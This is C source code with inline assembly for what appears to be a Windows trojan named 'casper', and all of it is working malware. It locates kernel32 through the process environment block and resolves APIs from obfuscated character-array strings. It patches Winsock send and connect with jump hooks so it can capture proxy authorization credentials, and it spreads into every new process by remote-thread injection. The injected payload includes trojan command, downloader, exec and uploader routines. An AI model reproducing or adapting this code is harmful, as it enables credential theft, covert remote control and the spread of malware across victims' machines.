#include "casper_inject.h"
#include "casper_trojan.h"


////////////////////////////////////////////////
//         Find kernel32.dll address          //
////////////////////////////////////////////////

void __forceinline FindKernel32()
{
	_asm
	{
        mov     edx, fs:[30h]
        mov     eax, [edx+0ch]
        mov     esi, [eax+01ch]
        mov     edx, [esi]
        mov     eax, [edx+8]
	}
}


////////////////////////////////////////////////
//       Find API address from its name       //
////////////////////////////////////////////////

void __forceinline GetProcFromKernel32(void* pKernel32, char* szProcName)
{
	_asm 
	{
			mov		eax, [pKernel32]
			mov		esi, [szProcName]
	
			mov     ebx, [eax+3ch]
			add     ebx, eax
			add     ebx, 78h
			mov     ebx, [ebx]
			add     ebx, eax
	
		    xor     edx, edx
			mov     ecx, [ebx+20h]
			add     ecx, eax
			push    esi
			push    edx

		CompareNext:
			pop     edx
			pop     esi
			inc     edx
			mov     edi, [ecx]
			add     edi, eax
			add     ecx, 4
			push    esi
			push    edx

		CompareName:
			mov     dl, [edi]
			mov     dh, [esi]
			cmp     dl, dh
			jne     CompareNext
			inc     edi
			inc     esi
			cmp     byte ptr [esi], 0
			je      GetAddress
			jmp     CompareName
	
		GetAddress:
			pop     edx
			pop     esi
			dec     edx
			shl     edx, 1
			mov     ecx, [ebx+24h]
			add     ecx, eax
			add     ecx, edx
			xor     edx, edx
			mov     dx, [ecx]
			shl     edx, 2
			mov     ecx, [ebx+1ch]
			add     ecx, eax
			add     ecx, edx
			add     eax, [ecx]
	}
}


//////////////////////////////////////////
//  Get address of the data structure   //
//////////////////////////////////////////

void __forceinline GetMyProcessData()
{
	HANDLE				hMapHandle;
	HMODULE				hMsvcrtDLL;	
	void*				pMappedMem = NULL;
	void*				pKernel32;
	char				szMappingName[260];
	char				szOpenFileMapping[24] =	{'O','p','e','n','F','i','l','e','M','a','p','p','i','n','g','A','\0'};
	char				szMapViewOfFile[24] =	{'M','a','p','V','i','e','w','O','f','F','i','l','e','\0'};
	char				szCloseHandle[24] =		{'C','l','o','s','e','H','a','n','d','l','e','\0'};
	char				szLoadLibrary[24] =		{'L','o','a','d','L','i','b','r','a','r','y','\0'};
	char				szGetProcAddress[24] =	{'G','e','t','P','r','o','c','A','d','d','r','e','s','s','\0'};
	char				lpMsvcrt[24] =	{'m','s','v','c','r','t','.','d','l','l','\0'};
	char				lpsprintf[24] =	{'s','p','r','i','n','t','f','\0'};
	char				lp_getpid[24] =	{'_','g','e','t','p','i','d','\0'};
	char				lpFormat[24] =	{'%','s','%','d','\0'};
	char				lpSharedMemName[24] =		{'M','S','S','h','a','r','e','d','M','e','m','o','r','y','\0'};
	
	injOpenFileMapping	   fnOpenFileMapping;
	injMapViewOfFile	   fnMapViewOfFile;
	injCloseHandle		   fnCloseHandle;
	injLoadLibrary		   fnLoadLibrary;
	injGetProcAddress	   fnGetProcAddress;
	injsprintf			   fnsprintf;
	inj_getpid			   fn_getpid;


	// Find Kernel32.dll's address:
	FindKernel32();
	_asm mov [pKernel32], eax;

	// Load APIs
	GetProcFromKernel32(pKernel32, szLoadLibrary);
	_asm mov [fnLoadLibrary], eax;
	GetProcFromKernel32(pKernel32, szGetProcAddress);
	_asm mov [fnGetProcAddress], eax;

	// Load msvcrt.dll
	hMsvcrtDLL	 = (HMODULE) fnLoadLibrary(lpMsvcrt);
		
	// Load APIs of msvcrt.dll
	fnsprintf = (injsprintf) fnGetProcAddress(hMsvcrtDLL, lpsprintf);
	fn_getpid = (inj_getpid) fnGetProcAddress(hMsvcrtDLL, lp_getpid);	

	fnsprintf(szMappingName, lpFormat, lpSharedMemName, fn_getpid());			
		
	// Get address of OpenFileMapping, MapViewOfFile and CloseHandle:
	GetProcFromKernel32(pKernel32, szOpenFileMapping);
	_asm mov [fnOpenFileMapping], eax;
	GetProcFromKernel32(pKernel32, szMapViewOfFile);
	_asm mov [fnMapViewOfFile], eax;
	GetProcFromKernel32(pKernel32, szCloseHandle);
	_asm mov [fnCloseHandle], eax;

	// Get handle on the data structure
	hMapHandle = fnOpenFileMapping(FILE_MAP_READ | FILE_MAP_WRITE,
		FALSE, szMappingName);

	if (hMapHandle == 0) {
		// Not found!
		_asm mov eax, 0;
	}
	else {
		// Found
		pMappedMem = fnMapViewOfFile(hMapHandle, FILE_MAP_READ |
			FILE_MAP_WRITE, 0, 0, sizeof(INJECTEDDATA));
		fnCloseHandle(hMapHandle);
		_asm mov eax, [pMappedMem];
	}
}


////////////////////////////////////////////////
// 				Hooking function              //
////////////////////////////////////////////////

int __forceinline HookAPI(LPSTR lpLibrary, PROC lpOriginalApi, PROC lpHookedApi, INJECTEDDATA *pData, int offset, int num)
{
	HMODULE	hKernel32DLL;		
	HMODULE	hMsvcrtDLL;		
	DWORD	dwOldProtect;	
	BYTE	jmp = 0xE9;
	DWORD	jmpadd;
	
	injGetCurrentProcess		fnGetCurrentProcess;
	injsprintf					fnsprintf;	
	injVirtualQuery				fnVirtualQuery;
	injVirtualProtect			fnVirtualProtect;
	injFlushInstructionCache	fnFlushInstructionCache;
	injVirtualAlloc				fnVirtualAlloc;
	
	MEMORY_BASIC_INFORMATION mbi;
	

	// Load DLLs
	hKernel32DLL = (HMODULE) pData->fnLoadLibrary(pData->lpKernel32);		
	hMsvcrtDLL	 = (HMODULE) pData->fnLoadLibrary(pData->lpMsvcrt);	
	
	// Load APIs of kernel32.dll	
	fnGetCurrentProcess		   = (injGetCurrentProcess) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[18]);	
	fnVirtualQuery			   = (injVirtualQuery) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[21]);	
	fnVirtualProtect		   = (injVirtualProtect) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[22]);		
	fnFlushInstructionCache	   = (injFlushInstructionCache) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[26]);
	fnVirtualAlloc			   = (injVirtualAlloc) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[27]);
	
	// Load APIs of msvcrt.dll
	fnsprintf = (injsprintf) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[6]);

	// Get information about virtual memory
	fnVirtualQuery(lpOriginalApi, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
	fnFlushInstructionCache(fnGetCurrentProcess(), lpOriginalApi, 5);	

	// Save firts instructions of API
	pData->pMem[num] = (PBYTE)fnVirtualAlloc(0, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	jmpadd = (DWORD)lpOriginalApi - (DWORD)pData->pMem[num] - 5;
	memset(pData->pMem[num], 0x90, 11);
	memcpy(pData->pMem[num], lpOriginalApi, offset);
	memcpy((pData->pMem[num]) + offset, &jmp, 1);
	memcpy((pData->pMem[num]) + offset + 1, &jmpadd, 4);

	// Change access protection on memory pages
	if (fnVirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE, &mbi.Protect) == FALSE)
		return 0;
	
	// Patch API with a jmp to our new function	
	jmpadd = (DWORD)lpHookedApi - (DWORD)lpOriginalApi - 5;
	memcpy(lpOriginalApi, &jmp, 1);
	memcpy((PBYTE)(lpOriginalApi) + 1, &jmpadd, 4);
	
	// Restore old memory protection
	fnVirtualProtect(mbi.BaseAddress,mbi.RegionSize, mbi.Protect, &dwOldProtect);
		
	return 1;
}


////////////////////////////////////////////////
// 			   New send function              //
////////////////////////////////////////////////

int WINAPI SendHook(SOCKET s, const char FAR * buf, int len, int flags)
{		
	int				Result;
	DWORD			ZoneTampon;	
	LPTSTR			pToken;
	LPTSTR			pToken2;
	LPTSTR			pProxy;
	INJECTEDDATA*	pData;				
	
	
	// Get data structure address
	GetMyProcessData();	
	_asm mov [pData], eax;
	
	// Check for GET http:// in data
	pProxy = pData->fnStrStr((LPTSTR)buf, (LPTSTR)pData->lpProxyGET);	

	if (pProxy != NULL) {
		pData->bProxy = TRUE;						

		// Get proxy authorization			
		pToken = pData->fnStrStr((LPTSTR)buf, (LPTSTR)pData->lpProxyBanner);	

		if (pToken != NULL) {
			pToken2 = pData->fnStrStr((LPTSTR)pToken, (LPTSTR)pData->lpReturn);
			memcpy(pData->lpAuthorization, pToken, pToken2-pToken);
			pData->bProxyAuth = TRUE;

			//INFO
			pData->fnOutputDebugString(pData->lpAuthorization);
		}	
	}
	
	// Send counter
	(pData->dwSend)++;

	// Memory area with firt instructions of the hooked API
	ZoneTampon = (DWORD)pData->pMem[SEND];
	
	// Call the real API via temporary memory area
	_asm {		
		push flags
		push len
		push buf
		push s
		call ZoneTampon
		
		mov Result, eax
	}			

	pData->fnOutputDebugString(pData->lpDebugSend);

	return (Result);
}


////////////////////////////////////////////////
// 			   New send function              //
////////////////////////////////////////////////

int WINAPI ConnectHook(SOCKET s, const struct sockaddr FAR*  name, int namelen)

{	
	INJECTEDDATA*		pData;				
	DWORD				ZoneTampon;
	TCHAR				lpIPPort[20];
	int					Result;		


	// Get data structure address
	GetMyProcessData();	
	_asm mov [pData], eax;
	
	// Get destination IP and TCP port	
	pData->uPort = pData->fnntohs(((SOCKADDR_IN *)(name))->sin_port);
	strcpy(pData->lpIP,pData->fninet_ntoa(((SOCKADDR_IN *)(name))->sin_addr));

	//INFO 
	pData->fnsprintf(lpIPPort, pData->lpFormatProxy, pData->lpIP, pData->uPort);
	pData->fnOutputDebugString(lpIPPort);
		
	// Memory area with firt instructions of the hooked API
	ZoneTampon = (DWORD)pData->pMem[CONNECT];
	
	// Call the real API via temporary memory area
	_asm {
		push namelen
		push name		
		push s
		call ZoneTampon
		
		mov Result, eax
	}			

	pData->fnOutputDebugString(pData->lpDebugConnect);

	return (Result);
}


////////////////////////////////////////////////
//           Main injected function           //
////////////////////////////////////////////////

void WINAPI InjectedMain(INJECTEDDATA *pData)
{		
	injGetCurrentProcess	fnGetCurrentProcess;
	injVirtualQuery			fnVirtualQuery;
	injVirtualProtect		fnVirtualProtect;
	injCreateFileMapping	fnCreateFileMapping;
	injMapViewOfFile		fnMapViewOfFile;	
	
	HMODULE	hKernel32DLL;	
	HMODULE	hUser32DLL;		
	HMODULE	hMsvcrtDLL;		
	HMODULE	hWs2_32DLL;		
	HMODULE	hShlwapiDLL;	
	HMODULE	hWininetDLL;	
	
	HANDLE	hMapHandle;
	HANDLE	hMutex;	
	HANDLE	hOpenMutex;	
	HANDLE	hProcessSnap = NULL; 
	LPVOID	pMappedMem = NULL;
	TCHAR	szMappingName[20];
	TCHAR	lpMutexName[20];
	TCHAR   lpError[20];
	DWORD	dwError;
	DWORD	dwStart;
	DWORD	dwEnd;
	DWORD	dwFreqTroj = 1;
	DWORD	dwFreqInj = 1;
	DWORD	th32ProcessID = 0;	
	DWORD	dwWaitResult;

	PROCESSENTRY32	pe32 = {0}; 
	INJECTEDDATA	pDataTmp;
			

	// Load DLLs
	hKernel32DLL = (HMODULE) pData->fnLoadLibrary(pData->lpKernel32);	
	hUser32DLL   = (HMODULE) pData->fnLoadLibrary(pData->lpUser32);
	hMsvcrtDLL	 = (HMODULE) pData->fnLoadLibrary(pData->lpMsvcrt);	
	hWs2_32DLL	 = (HMODULE) pData->fnLoadLibrary(pData->lpWs2_32);
	hShlwapiDLL	 = (HMODULE) pData->fnLoadLibrary(pData->lpShlwapi);
	hWininetDLL	 = (HMODULE) pData->fnLoadLibrary(pData->lpWininet);
	
	// Load APIs of kernel32.dll	
	fnGetCurrentProcess					= (injGetCurrentProcess) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[18]);	
	fnVirtualQuery						= (injVirtualQuery) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[21]);	
	fnVirtualProtect					= (injVirtualProtect) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[22]);	
	fnCreateFileMapping					= (injCreateFileMapping) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[23]);
	fnMapViewOfFile						= (injMapViewOfFile) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[24]);	
	pData->fnCreateMutex				= (injCreateMutex) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[5]);	
	pData->fnCreateToolhelp32Snapshot	= (injCreateToolhelp32Snapshot) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[8]);
	pData->fnProcess32First				= (injProcess32First) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[9]);
	pData->fnProcess32Next				= (injProcess32Next) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[10]);
	pData->fnOpenMutex					= (injOpenMutex) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[12]);
	pData->fnReleaseMutex				= (injReleaseMutex) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[14]);	
	pData->fnSleep						= (injSleep) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[16]);
	pData->fnExitThread					= (injExitThread) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[40]);
	pData->fnVirtualAlloc				= (injVirtualAlloc) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[27]);
	pData->fnGetLastError				= (injGetLastError) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[28]);
	pData->fnSetLastError				= (injSetLastError) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[29]);			
	pData->fnHeapAlloc					= (injHeapAlloc) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[47]);
	pData->fnHeapReAlloc				= (injHeapReAlloc) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[48]);
	pData->fnGetProcessHeap				= (injGetProcessHeap) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[49]);
	pData->fnHeapCreate					= (injHeapCreate) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[50]);
	pData->fnCreateFile					= (injCreateFile) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[51]);
	pData->fnWriteFile					= (injWriteFile) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[52]);
	pData->fnCloseHandle				= (injCloseHandle) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[53]);
	pData->fnCreateProcess				= (injCreateProcess) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[54]);
	pData->fnDeleteFile					= (injDeleteFile) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[55]);
	pData->fnGetFileSize				= (injGetFileSize) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[56]);
	pData->fnReadFile					= (injReadFile) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[57]);
	pData->fnGetTickCount				= (injGetTickCount) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[64]);
	pData->fnOpenProcess				= (injOpenProcess) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[65]);
	pData->fnVirtualAllocEx				= (injVirtualAllocEx) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[66]);
	pData->fnWaitForSingleObject		= (injWaitForSingleObject) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[13]);
	pData->fnWriteProcessMemory			= (injWriteProcessMemory) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[67]);
	pData->fnCreateRemoteThread			= (injCreateRemoteThread) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[68]);	
	pData->fnVirtualFreeEx				= (injVirtualFreeEx) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[69]);

		
	// Load APIs of msvcrt.dll
	pData->fn_getpid = (inj_getpid) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[7]);
	pData->fnsprintf = (injsprintf) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[6]);	
	pData->fnstrtok  = (injstrtok) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[32]);
	pData->fnstrncmp = (injstrncmp) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[33]);		
	pData->fnmalloc  = (injmalloc) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[44]);		
	pData->fnrealloc = (injrealloc) pData->fnGetProcAddress(hMsvcrtDLL, pData->injFunction[46]);		
	
	// Load APIs of user32.dll
	pData->fnMessageBox		   = (injMessageBox) pData->fnGetProcAddress(hUser32DLL, pData->injFunction[15]);	
	pData->fnMessageBeep	   = (injMessageBeep) pData->fnGetProcAddress(hUser32DLL, pData->injFunction[30]);
	pData->fnOutputDebugString = (injOutputDebugString) pData->fnGetProcAddress(hKernel32DLL, pData->injFunction[31]);	

	// Load APIs of ws2_32.dll
	pData->fnSendOriginal	 = (injSend)pData->fnGetProcAddress(hWs2_32DLL, pData->injFunction[20]);		
	pData->fnConnectOriginal = (injConnect)pData->fnGetProcAddress(hWs2_32DLL, pData->injFunction[36]);		
	pData->fnntohs			 = (injntohs)pData->fnGetProcAddress(hWs2_32DLL, pData->injFunction[37]);		
	pData->fninet_ntoa		 = (injinet_ntoa)pData->fnGetProcAddress(hWs2_32DLL, pData->injFunction[38]);		

	// Load APIs of shlwapi.dll
	pData->fnStrStr   = (injStrStr)pData->fnGetProcAddress(hShlwapiDLL, pData->injFunction[35]);		
	pData->fnStrChr   = (injstrchr) pData->fnGetProcAddress(hShlwapiDLL, pData->injFunction[34]);
	pData->fnStrNCpy  = (injstrncpy) pData->fnGetProcAddress(hShlwapiDLL, pData->injFunction[39]);

	// Load APIs of wininet.dll	
	pData->fnInternetOpen		   = (injInternetOpen)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[41]);
	pData->fnInternetOpenUrl	   = (injInternetOpenUrl)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[42]);	
	pData->fnInternetCloseHandle   = (injInternetCloseHandle)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[43]);	
	pData->fnInternetReadFile	   = (injInternetReadFile)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[45]);	
	pData->fnInternetConnect	   = (injInternetConnect)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[58]);	
	pData->fnHttpOpenRequest	   = (injHttpOpenRequest)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[59]);	
	pData->fnHttpAddRequestHeaders = (injHttpAddRequestHeaders)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[60]);	
	pData->fnHttpSendRequestEx	   = (injHttpSendRequestEx)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[61]);	
	pData->fnInternetWriteFile	   = (injInternetWriteFile)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[62]);	
	pData->fnHttpEndRequest		   = (injHttpEndRequest)pData->fnGetProcAddress(hWininetDLL, pData->injFunction[63]);	
			
				
	// Create injected process Mutex
	pData->fnsprintf(lpMutexName, pData->lpFormat, pData->lpMutexName, pData->fn_getpid());
	pData->fnCreateMutex(NULL, TRUE, lpMutexName);

	// INFO
	pData->fnOutputDebugString(lpMutexName);

	// Wait...
	pData->fnSleep(3000);

	// Create shared memory name	
	pData->fnsprintf(szMappingName, pData->lpFormat, pData->lpSharedMemName, pData->fn_getpid());			
			
	// Create shared memory for the data
	hMapHandle = fnCreateFileMapping((void*)0xFFFFFFFF, NULL, PAGE_READWRITE, 0,
									  sizeof(INJECTEDDATA), szMappingName);

	if (hMapHandle != NULL)	{
		pMappedMem = fnMapViewOfFile(hMapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		if (pMappedMem)	{
			memcpy(pMappedMem, pData, sizeof(INJECTEDDATA));
			pData = (INJECTEDDATA*)pMappedMem;
		}
	}

	// Launch hooking
	HookAPI(pData->lpWs2_32, (PROC)pData->fnConnectOriginal, (PROC)pData->fnConnectHook, pData, 6, CONNECT);	
	HookAPI(pData->lpWs2_32, (PROC)pData->fnSendOriginal, (PROC)pData->fnSendHook, pData, 6, SEND);	

	dwStart = pData->fnGetTickCount();

	// Main	
	while(1) {
		pData->fnSleep(1000);
		dwEnd = pData->fnGetTickCount();		

		if ( (pData->dwSend >= 5)&&( ((dwEnd - dwStart)/(DELAY_TROJ*1000)) >= dwFreqTroj) ) {			

			// Get commands
			((injTrojGetCmd)(pData->fnTrojGetCmd))(pData);				
			dwFreqTroj++;

			// If you want your data sent in the same time that user's data
			pData->dwSend = 0;

			// Reset these parameters to avoid probleme if the proxy is desactivated
			pData->bProxy = FALSE;
			pData->bProxyAuth = FALSE;
		}

		// Check for new process to inject		
		if ( (dwEnd - dwStart)/(DELAY_INJ*1000) >= dwFreqInj ) {
			dwFreqInj++;							

			// Create global mutex
			hMutex = pData->fnCreateMutex(NULL, FALSE, pData->lpMutexName);

			if(hMutex == 0)
				break;

			// Wait for the mutex			
			dwWaitResult = pData->fnWaitForSingleObject(hMutex, INFINITE);		

	
			// Process listing 
			hProcessSnap = pData->fnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

			if(hProcessSnap == INVALID_HANDLE_VALUE) 
				break; 

			pe32.dwSize = sizeof(PROCESSENTRY32);  
			th32ProcessID = pData->fnProcess32First(hProcessSnap, &pe32);	
	

			while(th32ProcessID) {
				th32ProcessID = pe32.th32ProcessID;

				// Inject only in a new process
				pData->fnsprintf(lpMutexName, pData->lpFormat, pData->lpMutexName, th32ProcessID);					
				hOpenMutex = pData->fnOpenMutex(MUTEX_ALL_ACCESS, FALSE, lpMutexName);

				if (hOpenMutex == NULL) {													
					dwError = pData->fnGetLastError();
					//pData->fnsprintf(lpError, pData->lpFormat, pData->lpError, dwError);
					//pData->fnOutputDebugString(lpError);
					pData->fnSleep(1000);
					
					// Error 5 if process can't open Mutex (access denied)
					if(dwError != 5) {
						memcpy(&pDataTmp, pData, sizeof(INJECTEDDATA));										
						((injInjectProcessI)(pData->fnInjectionFunc))(&pDataTmp, th32ProcessID);
					}
				}
				else {
					pData->fnCloseHandle(hOpenMutex);
				}

				pe32.dwSize = sizeof(PROCESSENTRY32);
				th32ProcessID = pData->fnProcess32Next(hProcessSnap, &pe32);		
			}	

			// Release global Mutex and its handle
			pData->fnReleaseMutex(hMutex);	
			pData->fnCloseHandle(hMutex);

			pData->fnCloseHandle(hProcessSnap);         								
		}
	}		

	pData->fnExitThread(0);		
}


int WINAPI InjectProcessI(INJECTEDDATA *pData, DWORD dwPID)
{
	DWORD			*pInjCode;	
	DWORD			*pInjFunc;
	DWORD			*pInjSend;
	DWORD			*pInjConnect;
	DWORD			*pInjTrojGetCmd;
	DWORD			*pInjTrojDownloader;
	DWORD			*pInjTrojMain;
	DWORD			*pInjTrojExec;
	DWORD			*pInjTrojUploader;
	DWORD			dwThreadId = 0;
	DWORD			lpNumberOfBytesWritten=0;
	HANDLE			hProcess;  
	HANDLE			hThread = NULL; 
	INJECTEDDATA	*pInjData;		


	// Open process
	hProcess = pData->fnOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	if(hProcess == NULL)
		return 0;	

	////////////////////////////////////////////
	//  Memory allocation and function write  //
	////////////////////////////////////////////

	// InjectedMain
	pInjCode = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
									  MEM_COMMIT, PAGE_EXECUTE_READWRITE);		

	if(pInjCode == NULL)		
		return 0;
	
	pData->fnWriteProcessMemory(hProcess, pInjCode, (LPVOID)pData->fnFunction, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);		
	
	
	// Injection function
	pInjFunc = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
									  MEM_COMMIT, PAGE_EXECUTE_READWRITE);		

	if(pInjFunc == NULL)	
		return 0;
	
	pData->fnWriteProcessMemory(hProcess, pInjFunc, (LPVOID)pData->fnInjectionFunc, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);		


	// Send
	pInjSend = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjSend == NULL)		
		return 0;	
	
	pData->fnWriteProcessMemory(hProcess, pInjSend, pData->fnSendHook, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// Connect
	pInjConnect = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjConnect == NULL)		
		return 0;	
	
	pData->fnWriteProcessMemory(hProcess, pInjConnect, pData->fnConnectHook, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);

	
	// TrojGetCmd
	pInjTrojGetCmd = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojGetCmd == NULL)		
		return 0;	
		
	pData->fnWriteProcessMemory(hProcess, pInjTrojGetCmd, (LPVOID)pData->fnTrojGetCmd, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojDownloader
	pInjTrojDownloader = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojDownloader == NULL)		
		return 0;	
	
	pData->fnWriteProcessMemory(hProcess, pInjTrojDownloader, (LPVOID)pData->fnTrojDownloader, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojMain
	pInjTrojMain = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojMain == NULL)		
		return 0;	
	
	pData->fnWriteProcessMemory(hProcess, pInjTrojMain, (LPVOID)pData->fnTrojMain, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojExec
	pInjTrojExec = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojExec == NULL)		
		return 0;	
		
	pData->fnWriteProcessMemory(hProcess, pInjTrojExec, (LPVOID)pData->fnTrojExec, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojUploader
	pInjTrojUploader = (PDWORD)pData->fnVirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojUploader == NULL)		
		return 0;	
		
	pData->fnWriteProcessMemory(hProcess, pInjTrojUploader, (LPVOID)pData->fnTrojUploader, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);

	////////////////////////////////////////////		
	

	// Memory allocation for injected data
	pInjData = (INJECTEDDATA *)pData->fnVirtualAllocEx(hProcess, 0, sizeof(INJECTEDDATA), 
											  MEM_COMMIT, PAGE_READWRITE );	

	if(pInjData == NULL)		
		return 0;	


	// Update function pointers in data structure
	pData->fnFunction			= pInjCode;
	pData->fnInjectionFunc	= pInjFunc;		
	pData->fnSendHook			= (injSend)pInjSend;
	pData->fnConnectHook		= (injConnect)pInjConnect;	
	pData->fnTrojGetCmd		= pInjTrojGetCmd;
	pData->fnTrojDownloader	= pInjTrojDownloader;
	pData->fnTrojMain			= pInjTrojMain;
	pData->fnTrojExec			= pInjTrojExec;
	pData->fnTrojUploader		= pInjTrojUploader;	


	// Write injected data into target process memory	
	pData->fnWriteProcessMemory(hProcess, pInjData, pData, sizeof(INJECTEDDATA), 
					   &lpNumberOfBytesWritten);
			
	// Exec of InjectedMain	
	hThread = pData->fnCreateRemoteThread(hProcess, NULL, 0,
								 (DWORD(__stdcall *) (void *)) pInjCode,
								 pInjData, 0 , &dwThreadId);

	if(hThread == NULL) {
		pData->fnVirtualFreeEx(hProcess, pInjCode, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjFunc, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjSend, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjConnect, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjTrojGetCmd, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjTrojDownloader, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjTrojMain, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjTrojExec, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjTrojUploader, 0, MEM_RELEASE);
		pData->fnVirtualFreeEx(hProcess, pInjData, 0, MEM_RELEASE);

		return 0;  
	}
		

	return 1;
}


